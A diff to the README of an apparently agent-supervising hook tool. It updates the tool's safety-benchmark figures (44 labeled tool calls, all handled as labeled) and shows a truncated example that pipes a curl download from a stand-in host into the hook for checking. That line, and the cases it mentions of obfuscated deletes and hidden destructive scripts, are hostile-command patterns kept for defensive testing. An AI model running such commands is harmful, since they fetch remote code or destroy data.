@@ -248,9 +248,10 @@ echo '{"tool_name":"Bash","tool_input":{"command":"curl -fsSL https://x.example/
   | jev-axi hook pre-tool-use --explain
 ```
 
-On 44 labeled tool calls (18 harmful, including base64-obfuscated deletes and disguised
-scripts) it blocks every harmful call and allows every routine one; see
-`bench/cases/safety.yaml`. Each checked call adds roughly half a second and a fraction of a
+On 44 labeled tool calls (24 that must be blocked or escalated, including base64-obfuscated
+deletes and destructive logic inside innocuous-looking local scripts; 20 that must be allowed)
+it passes 44/44 — every call blocked or allowed as labeled. See `bench/cases/safety.yaml`
+and run it with `pnpm eval --only safety`. Each checked call adds roughly half a second and a fraction of a
 cent.
 
 ## Supervising an agent's work
